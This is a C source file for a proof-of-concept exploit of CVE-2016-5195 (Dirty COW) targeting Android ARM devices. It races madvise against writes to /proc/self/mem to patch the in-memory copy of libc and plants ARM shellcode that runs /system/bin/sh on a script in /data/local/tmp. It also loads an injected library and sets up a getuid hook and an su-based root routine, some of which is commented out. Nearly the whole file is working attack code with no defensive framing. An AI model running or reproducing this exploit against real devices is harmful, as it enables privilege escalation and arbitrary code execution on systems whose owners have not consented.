/*
 * CVE-2016-5195 dirtypoc
 *
 * This PoC is memory only and doesn't write anything on the filesystem.
 * /!\ Beware, it triggers a kernel crash a few minutes.
 *
 * gcc -Wall -o dirtycow-mem dirtycow-mem.c -ldl -lpthread
 */

#define _GNU_SOURCE
#include <err.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <limits.h>
#include <pthread.h>
#include <stdbool.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <sys/types.h>


#define SHELLCODE	 "\x07\xc0\xa0\xe1\xc7\x70\xa0\xe3\x00\x00\x00\xef\x0c\x70\xa0\xe1\x00\x00\x50\xe3\x01\x00\x00\x0a\x01\x0a\x70\xe3\x1e\xff\x2f\x91\xff\x40\x2d\xe9\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x0c\x30\x01\x1c\x14\x31\x1c\x0a\x0b\x27\x00\xdf\xff\xbd\x2f\x73\x79\x73\x74\x65\x6d\x2f\x62\x69\x6e\x2f\x73\x68\x00"
#define SPACE_SIZE	256
#define LIBC_PATH	"/system/lib/libc.so"
#define LOOP		0x1000000

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

struct mem_arg  {
	struct stat st;
	off_t offset;
	unsigned int patch_addr;
	unsigned char *patch;
	unsigned char *check;
	size_t patch_size;
	void *map;
};


static int check(struct mem_arg * mem_arg)
{
	return memcmp(mem_arg->patch, mem_arg->check, mem_arg->patch_size) == 0;
}


static void *madviseThread(void *arg)
{
	struct mem_arg *mem_arg;
	size_t size;
	void *addr;
	int i;

	mem_arg = (struct mem_arg *)arg;
	addr = (void *)(mem_arg->offset & (~(PAGE_SIZE - 1)));
	size = mem_arg->offset - (unsigned long)addr;

	for( i = 0; i < LOOP; i++) {
		madvise(addr, size, MADV_DONTNEED);

		if (i % 0x1000 == 0 && check(mem_arg))
			break;
	}

	return NULL;
}

static void *procselfmemThread(void *arg)
{
	struct mem_arg *mem_arg;
	int fd, i;
	unsigned char *p;

	mem_arg = (struct mem_arg *)arg;
	p = mem_arg->patch;

	fd = open("/proc/self/mem", O_RDWR);
	if (fd == -1)
		err(1, "open(\"/proc/self/mem\"");

	for ( i = 0; i < LOOP; i++) {
		lseek(fd, mem_arg->offset, SEEK_SET);
		write(fd, p, mem_arg->patch_size);

		if (i % 0x1000 == 0 && check(mem_arg))
			break;
	}

	close(fd);

	return NULL;
}

static int get_range(unsigned int *start, unsigned int *end)
{
	char line[4096];
	char filename[PATH_MAX];
	char flags[32];
	FILE *fp;
	int ret;

	ret = -1;

	fp = fopen("/proc/self/maps", "r");
	if (fp == NULL)
		err(1, "fopen(\"/proc/self/maps\")");

	while (fgets(line, sizeof(line), fp) != NULL) {
		//printf("%s", line);
		sscanf(line, "%x-%x %s %*x %*x:%*x %*Lu %s", start, end, flags, filename);

		if (strstr(flags, "r-xp") == NULL)
			continue;

		if (strstr(filename, "/libc.so") == NULL)
			continue;
		//printf("[%lx-%6lx][%s][%s]\n", start, end, flags, filename);
		ret = 0;
		break;
	}

	fclose(fp);

	return ret;
}

static void getroot(void)
{
	execlp("su", "su", NULL);
	err(1, "failed to execute \"su\"");
}

static void exploit(struct mem_arg *mem_arg)
{
	pthread_t pth1, pth2;

	pthread_create(&pth1, NULL, madviseThread, mem_arg);
	pthread_create(&pth2, NULL, procselfmemThread, mem_arg);

	pthread_join(pth1, NULL);
	pthread_join(pth2, NULL);
}

void * get_func_addr(char * func)
{
	void * addr;
	void * handle;
	char * error;

	dlerror();

	handle = dlopen("libc.so", RTLD_LAZY);
	if (handle == NULL) {
		fprintf(stderr, "%s\n", dlerror());
		exit(EXIT_FAILURE);
	}

	addr = dlsym(handle, func);
	error = dlerror();
	if (error != NULL) {
		fprintf(stderr, "%s\n", error);
		exit(EXIT_FAILURE);
	}

	dlclose(handle);

	return addr;
}

void patch_libc(char * func, char * offset, char * payload, size_t payload_len) {
	unsigned int start, end;
	void * func_addr;
	struct mem_arg mem_arg;
	struct stat st;
	pid_t pid;
	int fd, pagenum;
	char opcode[8];
	
	if (get_range(&start, &end) != 0)
		errx(1, "failed to get range");

	printf("[*] range: [%x-%x]\n", start, end);

	func_addr = get_func_addr(func);
	printf("[*] %s = %p\n", func, func_addr);

	mem_arg.patch = malloc(payload_len);
	if (mem_arg.patch == NULL)
		err(1, "malloc");

	mem_arg.check = func_addr;
	
	memcpy(mem_arg.patch, payload, payload_len);
	mem_arg.patch_size = payload_len;

	fd = open(LIBC_PATH, O_RDONLY);
	if (fd == -1)
		err(1, "open(\"" LIBC_PATH "\")");
	if (fstat(fd, &st) == -1)
		err(1, "fstat");

	mem_arg.map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
	if (mem_arg.map == MAP_FAILED)
		err(1, "mmap");
	close(fd);

	printf("[*] mmap %p\n", mem_arg.map);

	mem_arg.st = st;
	mem_arg.offset = (off_t)((unsigned int)mem_arg.map + func_addr - start);

	exploit(&mem_arg);


	printf("[*] patch complete\n\n");
}

void patch(void * addr, char * payload, size_t payload_len) {
	unsigned int start, end;
	void * func_addr;
	struct mem_arg mem_arg;
	struct stat st;
	pid_t pid;
	int fd, pagenum;
	char opcode[8];
	
	if (get_range(&start, &end) != 0)
		errx(1, "failed to get range");

	printf("[*] range: [%x-%x]\n", start, end);

	mem_arg.patch = malloc(payload_len);
	if (mem_arg.patch == NULL)
		err(1, "malloc");

	mem_arg.check = addr;
	
	memcpy(mem_arg.patch, payload, payload_len);
	mem_arg.patch_size = payload_len;

	fd = open(LIBC_PATH, O_RDONLY);
	if (fd == -1)
		err(1, "open(\"" LIBC_PATH "\")");
	if (fstat(fd, &st) == -1)
		err(1, "fstat");

	mem_arg.map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
	if (mem_arg.map == MAP_FAILED)
		err(1, "mmap");
	close(fd);

	printf("[*] mmap %p\n", mem_arg.map);

	mem_arg.st = st;
	mem_arg.offset = (off_t)((unsigned int)mem_arg.map + addr - start);

	exploit(&mem_arg);

	printf("[*] patch complete\n\n");
}


int main(int argc, char *argv[])
{
	struct mem_arg mem_arg;
	int page_num;
	unsigned start, end;
	int rc;

	sleep(30);
	void* uid_addr = get_func_addr("getuid");
	void* dlopen_addr = get_func_addr("dlopen");
	printf("pid %d, getuid@ %08lx, dlopen@ %08lx\n", getpid(), uid_addr, dlopen_addr);
/*
   char *newargv[] = { "/system/bin/sh", "-c", "/system/bin/ls", NULL };
   char *newenviron[] = { NULL };

   execve("/system/bin/sh", newargv, newenviron);

   exit(0);*/
	dlopen("/data/local/tmp/inject.so", RTLD_NOW);
	dlopen("/data/local/tmp/inject.so", RTLD_NOW);
	dlopen("/data/local/tmp/inject.so", RTLD_NOW);
	dlopen("/data/local/tmp/inject.so", RTLD_NOW);
	dlopen("/data/local/tmp/inject.so", RTLD_NOW);
	dlopen("/data/local/tmp/inject.so", RTLD_NOW);


	if (get_range(&start, &end) != 0)
		errx(1, "failed to get range");

	//
char *SC =      "\x07\xc0\xa0\xe1"
				"\xc7\x70\xa0\xe3"
				"\x00\x00\x00\xef"
				"\x0c\x70\xa0\xe1"
				"\x00\x00\x50\xe3"
				"\x01\x00\x00\x0a"
				"\x01\x0a\x70\xe3"
				"\x1e\xff\x2f\x91"
				"\xff\x40\x2d\xe9"
				"\x01\x60\x8f\xe2"
                "\x16\xff\x2f\xe1"
                "\x85\xb0"
                "\x78\x46"
                "\x22\x30"
                "\x00\x90"
                "\x0f\x30"
                "\x01\x90"
                "\x03\x30"
                "\x02\x90"
                "\x00\x1a"
                "\x03\x90"
                "\x04\x90"
                "\x00\x98"
                "\x69\x46"
                "\x92\x1a"
                "\x04\xaa"
                "\x0b\x27"
                "\x00\xdf"
                "\x05\xb0"
                "\x47\x70"
                "\xff\xbd"
                "\x2f"
                "\x73\x79"
                "\x73\x74"
                "\x65\x6d"
                "\x2f"
                "\x62\x69"
                "\x6e\x2f"
                "\x73\x68\x00\x2d\x63\x00\x2f\x64\x61\x74\x61\x2f\x6c\x6f\x63\x61\x6c\x2f\x74\x6d\x70\x2f\x72\x2e\x73\x68\x00\x00\x00\x00\x00\x00\x00\x00";
 

    patch(end-0x1d0, SC, 150);
    
    printf("uid_addr %08lx", uid_addr);
    int offset = end-0x1d0-(int)uid_addr;
    printf("offset %08lx", offset);
    char JMP[] = "\x04\xc0\x9f\xe5\x0c\xc0\x8f\xe0\x1c\xff\x2f\xe1\x00\x00\x00\x00";
    *(int*)&JMP[12] = offset-12;
    //patch(uid_addr, JMP, 16);           

    //void * addr;
    //addr = (void *)((int)uid_addr & (~(PAGE_SIZE - 1)));
    //mprotect (addr, PAGE_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC);
 
 	//memcpy(uid_addr, JMP, 16);

	printf("getuid() = %d\n", getuid());
	//printf("geteuid() = %d\n", geteuid());
	
	//getroot();

	exit(0);
}
